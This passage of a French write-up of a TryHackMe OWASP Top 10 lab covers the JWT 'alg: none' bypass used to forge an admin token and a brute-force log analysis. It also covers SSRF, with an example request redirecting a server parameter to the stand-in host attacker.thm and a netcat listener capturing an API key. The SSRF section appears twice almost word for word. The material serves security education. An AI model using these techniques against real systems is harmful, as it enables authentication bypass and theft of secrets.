Par exemple, si vous créez une application de messagerie Web, vous pouvez attribuer à chaque utilisateur après la `connexion un cookie` contenant son **nom d'utilisateur**. Lors des requêtes ultérieures, votre navigateur enverra toujours votre nom d'utilisateur dans le cookie afin que votre application Web sache quel utilisateur se connecte. Ce serait une très mauvaise idée du point de vue de la sécurité car, comme nous l'avons mentionné, les cookies sont stockés sur le **navigateur de l'utilisateur**, donc si l'utilisateur altère le cookie et modifie le nom d'utilisateur, il pourrait potentiellement **usurper** l'identité de quelqu'un d'autre et lire ses e-mails ! Cette application souffrirait d'une défaillance de l'intégrité des données, car elle fait confiance aux données qu'un attaquant peut falsifier.

Une solution à ce problème consiste à utiliser un mécanisme d'**intégrité** pour garantir que le cookie n'a pas été modifié par l'utilisateur. Pour éviter de réinventer la roue, nous pourrions utiliser certaines implémentations de jetons qui vous permettent de faire cela et de gérer toute la cryptographie pour fournir une preuve d'intégrité sans que vous ayez à vous en préoccuper. L'une de ces implémentations est les **jetons Web JSON** (`JWT`).

Les `JWT` sont des jetons très simples qui vous permettent de stocker des paires clé-valeur sur un jeton qui assure l'intégrité dans le cadre du jeton. L'idée est que vous pouvez générer des jetons que vous pouvez donner à vos utilisateurs avec la certitude qu'ils ne pourront pas modifier les paires `clé-valeur` et réussir le contrôle d'intégrité. La structure d'un **token JWT** est formée de 3 parties :

![JWT](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png)

Notez que chacune des 3 parties du jeton est simplement codée en texte brut en base64. Vous pouvez utiliser [cet outil en ligne](https://appdevtools.com/base64-encoder-decoder) pour encoder/décoder en base64. Essayez de décoder l'en-tête et la charge utile du jeton suivant :

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`

> Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.
{: .prompt-info}

**JWT et l'algorithme None**

Une vulnérabilité de défaillance de l'intégrité des données était présente il y a quelque temps sur certaines bibliothèques implémentant des **JWT**. Comme nous l'avons vu, JWT implémente une signature pour valider l'intégrité des données utiles. Les bibliothèques vulnérables ont permis aux attaquants de contourner la validation de signature en modifiant les deux éléments suivants dans un JWT :

- Modifiez la section d'en-tête du jeton afin que l'en-tête `alg` contienne la valeur `none`.
- Supprimez la partie signature.

![JWT sign](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png)

---

**Try logging into the application as guest. What is guest's account password?**

**Réponse :** `guest`

Et comme prévu notre session a créé un **JWT** comme on peut le voir ci dessous :

![JWT prev](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/17765aa7418c977b2d07aa67305e04ad.png)

ou sur chrome :

![JWT chrome](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cd52fcfd91df145fb31d7bad9b56ebdc.png)

**What is the name of the website's cookie containing a JWT token?**

**Réponse :** `jwt-session`

**Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".**

Pas de réponse nécessaire mais on va quand même passer admin pour avoir le dernier flag.

Pour se faire je suis allé sur ce site [fusionauth](https://fusionauth.io/dev-tools/jwt-decoder) j'ai copié mon token de `guest` et je l'ai mis dans le champs token, qui était celui ci avant : `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzYxMTU5NTA4fQ.2p63Tbppl28MsoE3Y1L-mAOYk-j6bPbqPl6Ygn0D6O8` mais sur le site on peut voir les 3 parties, en vert, bleu et rouge. Il fallait enlever la partie rouge et faire comme sur le schéma du dessus, c'est à dire mettre `none` à `alg` et mettre `admin` au `username`.
Ensuite on avait juste besoin de coller notre token modifié dans le cookie de notre navigateur en tant que guest et rafraichir la page.

**Réponse :** `THM{Dont_take_cookies_from_strangers}`

### Task 22 - 9. Security Logging and Monitoring Failures

**Défaillances de la journalisation et de la surveillance de la sécurité** se produisent lorsque les applications Web ne parviennent pas à enregistrer correctement les événements de sécurité importants ou lorsque ces journaux ne sont pas correctement surveillés. Sans journalisation et surveillance appropriées, il est impossible de détecter les attaques en cours ou d'enquêter sur les incidents de sécurité après coup.

Lorsque les applications Web sont configurées, chaque action effectuée par l'utilisateur devrait être enregistrée. La **journalisation** est cruciale car, en cas d'incident de sécurité, elle permet de retracer les activités des attaquants. Une fois leurs actions retracées, leur risque et leur impact peuvent être déterminés. Sans journalisation adéquate, il serait impossible de savoir quelles actions ont été effectuées par un attaquant lors d'une compromission.

Les impacts majeurs incluent :

- **Dommages réglementaires :** Si un attaquant accède à des informations personnellement identifiables (PII) et qu'il n'y a aucune trace de cet accès, les utilisateurs finaux sont affectés et les propriétaires de l'application peuvent être soumis à des amendes ou à des mesures plus sévères selon la réglementation (RGPD, etc.).

- **Risque d'attaques supplémentaires :** La présence d'un attaquant peut **ne pas être détectée sans journalisation appropriée**. Cela pourrait permettre à un attaquant de lancer d'autres attaques contre l'infrastructure, de voler des identifiants supplémentaires, ou de maintenir un accès persistant.

Les informations importantes qui devraient être enregistrées dans les logs incluent :

- **Codes de statut HTTP** (200, 401, 404, 500, etc.)
- **Noms d'utilisateur** (pour les tentatives de connexion réussies et échouées)
- **Horodatages** (timestamps) - pour établir une chronologie des événements
- **Points de terminaison d'API / emplacements de pages** accédés
- **Adresses IP** des clients

---

**What IP address is the attacker using?**

En analysant les logs fournis :

```bash
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ cat login-logs_1595366583422.txt          
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login 
```

Nous pouvons observer que l'adresse IP `49.99.13.16` effectue plusieurs tentatives de connexion échouées (code 401) avec différents noms d'utilisateur communs (`admin`, `administrator`, `anonymous`, `root`) en un court laps de temps (seulement 15 secondes entre les tentatives).

**Réponse :** `49.99.13.16`

**What kind of attack is being carried out?**

Le pattern observé dans les logs est caractéristique d'une attaque par **force brute** : un attaquant essaie systématiquement différents noms d'utilisateur (et probablement mots de passe) pour tenter de s'authentifier sur le système. Les multiples échecs d'authentification successifs provenant de la même adresse IP en sont la preuve.

**Réponse :** `brute force`

### Task 22 - 10. Server-Side Request Forgery (SSRF)

**Falsification de requête côté serveur** (Server-Side Request Forgery)

Ce type de vulnérabilité se produit lorsqu'un attaquant peut contraindre une application Web à envoyer des requêtes HTTP en son nom vers des destinations arbitraires, tout en contrôlant le contenu de la requête elle-même. Les vulnérabilités `SSRF` proviennent souvent d'implémentations dans lesquelles l'application Web doit utiliser des services tiers ou des ressources externes.

Prenons l'exemple d'une application Web qui utilise une **API externe** pour envoyer des notifications par SMS à ses clients. Pour chaque SMS envoyé, le site Web doit faire une requête HTTP au serveur du fournisseur SMS avec le contenu du message. Étant donné que le fournisseur de SMS facture par message, il exige que vous ajoutiez une clé secrète (clé API) pré-attribuée à chaque requête. Cette clé API sert de jeton d'authentification et permet au fournisseur de savoir à qui facturer chaque message.

L'application fonctionnerait normalement comme ceci :

![SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png)

En regardant le schéma ci-dessus, il est facile de voir où se situe la vulnérabilité. L'application expose le paramètre `server` aux utilisateurs, qui définit le nom du serveur du fournisseur de services SMS. Si un attaquant le souhaite, il pourrait simplement modifier la valeur du paramètre `server` pour pointer vers une machine qu'il contrôle. L'application Web transmettrait alors volontiers la requête SMS à l'attaquant au lieu du fournisseur SMS légitime.

Dans le cadre du message transféré, l'attaquant obtiendrait la clé API, lui permettant d'utiliser le service SMS pour envoyer des messages à vos frais. Pour y parvenir, l'attaquant n'aurait qu'à faire la requête suivante :

```bash
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

Cela amènerait l'application Web vulnérable à faire une requête vers :

```bash
https://attacker.thm/api/send?msg=ABC
```

L'attaquant peut alors simplement capturer le contenu de la requête (y compris la clé API secrète) en utilisant `Netcat` :

```bash
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

Maintenant, rendez-vous sur le port `8087` de la machine cible pour pratiquer !

---

**Explore the website. What is the only host allowed to access the admin area?**

En naviguant sur le site et en cliquant sur le menu (les trois barres sur le côté), nous trouvons un lien vers "Admin Area". En y accédant, nous voyons le message suivant : `Admin interface only available from localhost!!!`

**Réponse :** `localhost`

**Check the "Download Resume" button. Where does the server parameter point to?**

En examinant le lien généré lorsque nous cliquons sur le bouton "Download Resume", nous observons l'URL suivante :

```
http://10.10.2.128:8087/download?server=secure-file-storage.com:8087&id=75482342
```

Le paramètre `server` pointe vers le domaine du serveur de stockage de fichiers.

**Réponse :** `secure-file-storage.com`

**Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**

Pour exploiter la vulnérabilité SSRF, voici la procédure :

1. **Mettre en place un listener :** D'abord, nous devons mettre un terminal en écoute pour capturer la requête lorsque nous redirigerons l'application vers notre machine. Nous utilisons `Netcat` sur le port 80 :

```bash
nc -lvp 80
```

2. **Obtenir notre adresse IP :** Nous devons connaître l'adresse IP de notre AttackBox. Utilisez la commande `ip a` pour l'obtenir.

3. **Modifier l'URL :** Ensuite, nous modifions l'URL du téléchargement en remplaçant `secure-file-storage.com:8087` par notre adresse IP suivie du port `80` :

```
http://10.10.2.128:8087/download?server=10.9.1.199:80&id=75482342
```

4. **Intercepter la requête :** Une fois l'URL modifiée et soumise, notre listener Netcat capture la requête entrante :

```bash
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ nc -lvp 80    
listening on [any] 80 ...
10.10.2.128: inverse host lookup failed: Unknown host
connect to [10.9.1.199] from (UNKNOWN) [10.10.2.128] 46164
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.9.1.199
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

Nous pouvons clairement voir la clé API dans l'en-tête `X-API-KEY` de la requête interceptée !

**Réponse :** `THM{Hello_Im_just_an_API_key}`

### Task 23 - 10. Server-Side Request Forgery (SSRF)

**Contrefaçon de requête côté serveur**

Ce type de vulnérabilité se produit lorsqu'un attaquant peut contraindre une application Web à envoyer des requêtes en son nom vers des destinations arbitraires tout en contrôlant le contenu de la requête elle-même. Les vulnérabilités `SSRF` proviennent souvent d'implémentations dans lesquelles notre application Web doit utiliser des services tiers.

Pensez, par exemple, à une application Web qui utilise une **API externe** pour envoyer des notifications par SMS à ses clients. Pour chaque e-mail, le site Web doit faire une requête Web au serveur du fournisseur SMS pour envoyer le contenu du message à envoyer. Étant donné que le fournisseur de SMS facture par message, il vous demande d'ajouter une clé secrète, qu'il vous pré-attribue, à chaque requête que vous faites à son API. La clé API sert de jeton d'authentification et permet au fournisseur de savoir à qui facturer chaque message. L'application fonctionnerait comme ceci :

![SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png)

En regardant le schéma ci-dessus, il est facile de voir où se situe la vulnérabilité. L'application expose le paramètre de serveur aux utilisateurs, qui définit le nom du serveur du fournisseur de services SMS. Si l'attaquant le souhaitait, il pourrait simplement modifier la valeur du serveur pour pointer vers une machine qu'il contrôle, et votre application Web transmettrait volontiers la demande SMS à l'attaquant au lieu du fournisseur SMS. Dans le cadre du message transféré, l'attaquant obtiendrait la clé API, lui permettant d'utiliser le service SMS pour envoyer des messages à vos frais. Pour y parvenir, l'attaquant n'aurait qu'à faire la requête suivante à votre site Web :

```bash
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

Cela amènerait l'application Web vulnérable à faire une requête pour :

```bash
https://attacker.thm/api/send?msg=ABC
```

Vous pouvez alors simplement capturer le contenu de la requête à l'aide de `Netcat` :

```bash
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

Maintenant on se rend sur le port `8087` pour pratiquer !

---

**Explore the website. What is the only host allowed to access the admin area?**

Quand on va dans les 3 barres sur le côté dans le site ça nous donne un gros lien jaune avec écrit Admin Area et une fois dessus il y a écrit ça : `Admin interface only available from localhost!!!`

**Réponse :** `localhost`

**Check the "Download Resume" button. Where does the server parameter point to?**

Voici le lien exact quand on clique sur le bouton `Download` : `http://10.10.2.128:8087/download?server=secure-file-storage.com:8087&id=75482342`

**Réponse :** `secure-file-storage.com`

**Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**

En premier j'ai besoin de mettre en "écoute" un terminal pour qu'il puisse capturer la cible dès que je vais la renvoyer vers la mauvaise URL et ensuite il nous faut notre IP qu'on peut avoir avec la commande `ip a`

Pour mettre en écoute un terminal avec `Netcat` :

```bash
nc -lvp 80
```

Et l'url d'avant, à la place de `secure-file-storage.com` on doit mettre notre IP suivi du port `80` comme on a configuré dans notre écouteur juste avant. Voici la commande entière : `http://10.10.2.128:8087/download?server=10.9.1.199:80&id=75482342`

Et une fois l'url entrée, voici ce que ça nous donne sur notre **netcat** :

```bash
┌──(omnimessie㉿omnimessie)-[~/Downloads]
└─$ nc -lvp 80    
listening on [any] 80 ...
10.10.2.128: inverse host lookup failed: Unknown host
connect to [10.9.1.199] from (UNKNOWN) [10.10.2.128] 46164
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.9.1.199
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**Réponse :** `THM{Hello_Im_just_an_API_key}`

### Task 24 - What Next?

Bravo on a fini ce cours avec succès !

**Room Complétée**

{% include comments.html %}